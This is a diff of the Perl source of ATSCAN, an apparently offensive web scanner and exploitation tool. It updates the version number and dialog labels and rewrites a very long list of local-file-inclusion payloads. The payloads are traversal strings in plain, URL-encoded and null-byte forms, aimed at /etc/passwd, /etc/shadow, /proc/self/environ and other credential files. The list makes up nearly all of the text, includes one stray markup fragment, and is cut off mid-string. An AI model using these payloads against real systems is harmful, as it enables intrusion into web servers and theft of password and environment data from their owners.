@@ -85,11 +85,12 @@ sub points { my $sn4="." x 75; print $c[10]."    $sn4\n"; }
 sub ltak { my $sn5="-" x 79; print $c[10]."$sn5\n"; }
 sub stak { my $sn6="-" x 75; print $c[10]."    $sn6\n"; }
 sub stakScan { my $ee=":" x 67; print $c[0]."$ee\n"; }
+my $sp=" " x 11;
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## TOOL VERSION
 my ($Version, $logoVersion, $scriptUrl, $logUrl, $ipUrl);
-$Version="10.8";
+$Version="11.0";
 $logoVersion="V $Version";
 $scriptUrl="https://raw.githubusercontent.com/AlisamTechnology/ATSCAN/master/atscan.pl";
 $logUrl="https://raw.githubusercontent.com/AlisamTechnology/ATSCAN/master/version.log";
@@ -266,7 +267,7 @@ my @DT=("Target\(s\) Found", "No Results Found\!", "Error\! Not a Valid Target\!
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## SCAN DIALOG TEXT
-my @DS=("DORK", "INFO", "SERVER", "HTTP", "SCAN", "PAYLD", "EXPLT", "PORT", "TYPE", "TARGET", "IP", "PROXY", "VALIDATION", "HTTP/1.1", "EXPLOITATION", "GET", "EXTRA", "SHELL", "LEVEL", "OUTPUT", "EXT CMD", "TASK", "BING", "GOOGLE", "ASK [com]", "YANDEX [com]", "SOGOU [com]", "BING GOOGLE ASK YANDEX DOGOU", "DEFAULT BING", "ENGINE", "Unique Results", "Ifinurl VLD", "URL REGEX", "Validate Url", "Server Sites", "WP sites", "JOOM sites", "Subdomains", "No extra info", "Beep Sound", "Remove Query", "Regex", "Open", "Closed", "Random Proxy", "Tor Proxy", "No Proxy", "Range", "Replace", "Vul Param:", "Upload", "External Command", "Update Version", "E-mails", "Encode Base64", "Decode Base64", "Get host", "Pause Mode", "ADMIN", "PORTS", "XSS", "LFI", "RFI", "AFD", "TCP", "UDP", "ZIP", "STARTING", "Md5", "Proxy");
+my @DS=("DORK", "INFO", "SERVER", "HTTP", "SCAN", "PAYLD", "EXPLT", "PORT", "TYPE", "TARGET", "IP", "PROXY", "VALID", "HTTP/1.1", "EXPLOIT", "GET", "EXTRA", "SHELL", "LEVEL", "OUTPUT", "EXT CMD", "TASK", "BING", "GOOGLE", "ASK [com]", "YANDEX [com]", "SOGOU [com]", "BING GOOGLE ASK YANDEX DOGOU", "DEFAULT BING", "ENGINE", "Unique Results", "Ifinurl VLD", "URL REGEX", "Validate Url", "Server Sites", "WP sites", "JOOM sites", "Subdomains", "No extra info", "Beep Sound", "Remove Query", "Regex", "Open", "Closed", "Random Proxy", "Tor Proxy", "No Proxy", "Range", "Replace", "Vul Param:", "Upload", "External Command", "Update Version", "E-mails", "Encode Base64", "Decode Base64", "Get host", "Pause Mode", "ADMIN", "PORTS", "XSS", "LFI", "RFI", "AFD", "TCP", "UDP", "ZIP", "STARTING", "Md5", "Proxy");
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## ENGINE LANGUAGES
@@ -377,7 +378,7 @@ my @SCAN_TITLE=("SEARCH ENGINE", "VALIDATION", "Validate by HTTP header is not a
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## LFI
-my @LFI=("/passwd.txt", "/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","....//etc/passwd","....//....//etc/passwd","....//....//....//etc/passwd","....//....//....//....//etc/passwd","....//....//....//....//....//etc/passwd","....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//....//....//etc/passwd","....//etc/passwd%00","....//....//etc/passwd%00","....//....//....//etc/passwd%00","....//....//....//....//etc/passwd%00","....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/passwd%00","%2Fetc%2Fpasswd","..%2Fetc%2Fpasswd","..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","%2Fetc%2Fpasswd%00","..%2Fetc%2Fpasswd%00","..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","....%2f%2Fetc/passwd","....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","/proc/self/environ","../proc/self/environ","../../proc/self/environ","../../../proc/self/environ","../../../../proc/self/environ","../../../../../proc/self/environ","../../../../../../proc/self/environ","../../../../../../../proc/self/environ","../../../../../../../../proc/self/environ","../../../../../../../../../proc/self/environ","../../../../../../../../../../proc/self/environ","/proc/self/environ%00","../proc/self/environ%00","../../proc/self/environ%00","../../../proc/self/environ%00","../../../../proc/self/environ%00","../../../../../proc/self/environ%00","../../../../../../proc/self/environ%00","../../../../../../../proc/self/environ%00","../../../../../../../../proc/self/environ%00","../../../../../../../../../proc/self/environ%00","../../../../../../../../../../proc/self/environ%00","%2Fproc%2Fself%2Fenviron","..%2Fproc%2Fself%2Fenviron","..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","%2Fproc%2Fself%2Fenviron%00","..%2Fproc%2Fself%2Fenviron%00","..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","//proc/self/environ","....//proc/self/environ","....//....//proc/self/environ","....//....//....//proc/self/environ","....//....//....//....//proc/self/environ","....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//....//....//proc/self/environ","//proc/self/environ%00","....//proc/self/environ%00","....//....//proc/self/environ%00","....//....//....//proc/self/environ%00","....//....//....//....//proc/self/environ%00","....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//....//....//proc/self/environ%00","%2f%2Fproc/self/environ","....%2f%2Fproc/self/environ","....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","%2f%2Fproc/self/environ%00","....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F..<!---->..%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","/etc/shadow","../etc/shadow","../../etc/shadow","../../../etc/shadow","../../../../etc/shadow","../../../../../etc/shadow","../../../../../../etc/shadow","../../../../../../../etc/shadow","../../../../../../../../etc/shadow","../../../../../../../../../etc/shadow","../../../../../../../../../../etc/shadow","/etc/shadow%00","../etc/shadow%00","../../etc/shadow%00","../../../etc/shadow%00","../../../../etc/shadow%00","../../../../../etc/shadow%00","../../../../../../etc/shadow%00","../../../../../../../etc/shadow%00","../../../../../../../../etc/shadow%00","../../../../../../../../../etc/shadow%00","../../../../../../../../../../etc/shadow%00","%2Fetc..%2Fshadow","..%2Fetc%2Fshadow","..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","%2Fetc..%2Fshadow%00","..%2Fetc%2Fshadow%00","..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","%2F%2Fetc/shadow","....%2f%2Fetc/shadow","....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","%2F%2Fetc/shadow%00","....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....//etc/shadow","....//....//etc/shadow","....//....//....//etc/shadow","....//....//....//....//etc/shadow","....//....//....//....//....//etc/shadow","....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//....//....//etc/shadow","....//etc/shadow%00","....//....//etc/shadow%00","....//....//....//etc/shadow%00","....//....//....//....//etc/shadow%00","....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//....//....//etc/shadow%00","/etc/group","../etc/group","../../etc/group","../../../etc/group","../../../../etc/group","../../../../../etc/group","../../../../../../etc/group","../../../../../../../etc/group","../../../../../../../../etc/group","../../../../../../../../../etc/group","../../../../../../../../../../etc/group","/etc/group%00","../etc/group%00","../../etc/group%00","../../../etc/group%00","../../../../etc/group%00","../../../../../etc/group%00","../../../../../../etc/group%00","../../../../../../../etc/group%00","../../../../../../../../etc/group%00","../../../../../../../../../etc/group%00","../../../../../../../../../../etc/group%00","%2Fetc..%2Fgroup","..%2Fetc%2Fgroup","..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","%2Fetc%2Fgroup%00","..%2Fetc%2Fgroup%00","..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","%2F%2Fetc/group","....%2F%2Fetc/group","....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","/etc/group%00","....%2F%2Fetc/group%00","....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","//etc/group","....//etc/group","....//....//etc/group","....//....//....//etc/group","....//....//....//....//etc/group","....//....//....//....//....//etc/group","....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//....//....//etc/group","//etc/group%00","....//etc/group%00","....//....//etc/group%00","....//....//....//etc/group%00","....//....//....//....//etc/group%00","....//....//....//....//....//etc/group%00","....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//....//....//etc/group%00","/etc/security/passwd","../etc/security/passwd","../../etc/security/passwd","../../../etc/security/passwd","../../../../etc/security/passwd","../../../../../etc/security/passwd","../../../../../../etc/security/passwd","../../../../../../../etc/security/passwd","../../../../../../../../etc/security/passwd","../../../../../../../../../etc/security/passwd","../../../../../../../../../../etc/security/passwd","/etc/security/passwd%00","../etc/security/passwd%00","../../etc/security/passwd%00","../../../etc/security/passwd%00","../../../../etc/security/passwd%00","../../../../../etc/security/passwd%00","../../../../../../etc/security/passwd%00","../../../../../../../etc/security/passwd%00","../../../../../../../../etc/security/passwd%00","../../../../../../../../../etc/security/passwd%00","../../../../../../../../../../etc/security/passwd%00","%2Fetc%2Fsecurity%2Fpasswd","..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","%2Fetc%2Fsecurity%2Fpasswd%00","..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....//etc/security/passwd","....//....//etc/security/passwd","....//....//....//etc/security/passwd","....//....//....//....//etc/security/passwd","....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//....//etc/security/passwd","....//etc/security/passwd%00","....//....//etc/security/passwd%00","....//....//....//etc/security/passwd%00","....//....//....//....//etc/security/passwd%00","....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/security/passwd%00","/etc/security/passwd","../etc/security/passwd","../../etc/security/passwd","../../../etc/security/passwd","../../../../etc/security/passwd","../../../../../etc/security/passwd","../../../../../../etc/security/passwd","../../../../../../../etc/security/passwd","../../../../../../../../etc/security/passwd","../../../../../../../../../etc/security/passwd","../../../../../../../../../../etc/security/passwd","/etc/security/passwd%00","../etc/security/passwd%00","../../etc/security/passwd%00","../../../etc/security/passwd%00","../../../../etc/security/passwd%00","../../../../../etc/security/passwd%00","../../../../../../etc/security/passwd%00","../../../../../../../etc/security/passwd%00","../../../../../../../../etc/security/passwd%00","../../../../../../../../../etc/security/passwd%00","../../../../../../../../../../etc/security/passwd%00","%2Fetc%2Fsecurity%2Fpasswd","..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","%2Fetc%2Fsecurity%2Fpasswd%00","..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","....%